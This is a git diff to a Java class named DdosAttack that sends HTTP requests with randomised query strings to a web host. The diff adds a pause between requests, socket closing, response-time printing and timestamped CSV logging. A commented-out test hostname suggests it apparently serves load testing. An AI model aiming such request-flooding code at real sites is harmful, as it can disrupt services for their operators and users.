@@ -19,6 +19,9 @@ import java.io.*;
 import java.net.Socket;
 import java.net.URI;
 import java.net.URLEncoder;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.Random;
 import java.util.logging.Level;
@@ -34,6 +37,7 @@ public class DdosAttack {
     //private String URL = "chicagotest.q4web.com";
     private String PROTOCOL = "http://";
     private int REF_NUM = 5;
+    private static final long DEFAULT_PAUSE = 40;
 
     public void DdosAttackRequest(String sUrl, JSONObject data, FileWriter writer) {
 
@@ -51,7 +55,7 @@ public class DdosAttack {
             String queryQ4 = "";
             String queryR = "";
             //final String alphabetQ4 = "                                                       0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+{_[=-&*#~+:;`]|}!@^";
-            final String alphabetR = "+++++++++++++++++++++++++++++++++++++++++++++++++++++++0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+{_[=-&*#~+:;`]|}!@^";
+            final String alphabetR = "+++++++++++++++++++++++++++++++++++++++++++++++++++++++0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+{_[=-~+`]|}^";
             final int Nq4 = alphabetR.length();
             final int Nr = alphabetR.length();
 
@@ -69,6 +73,7 @@ public class DdosAttack {
             String fullURL = PROTOCOL+URL+"/"+queryQ4;
             System.out.println(fullURL);
 
+            Thread.sleep(DEFAULT_PAUSE);
             Socket socket = new Socket(URL, 80);
 
             PrintWriter request = new PrintWriter(socket.getOutputStream());
@@ -98,6 +103,8 @@ public class DdosAttack {
             rd.close();
             long end = System.currentTimeMillis();
             long result = end-start;
+            socket.close();
+            System.out.println("Round trip response time = " + result + " millis");
 
             /*
             HttpGet request = new HttpGet(fullURL);
@@ -141,6 +148,10 @@ public class DdosAttack {
             System.out.println("\n Done");
             */
 
+            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
+            Date today = Calendar.getInstance().getTime();
+            String recordDate = df.format(today);
+
             try
             {
                 writer.append(fullURL);
@@ -150,6 +161,8 @@ public class DdosAttack {
                 writer.append(sReferralUrl);
                 writer.append(',');
                 writer.append(Long.toString(statusCode));
+                writer.append(',');
+                writer.append(recordDate);
                 writer.append('\n');
             }
             catch(IOException e)
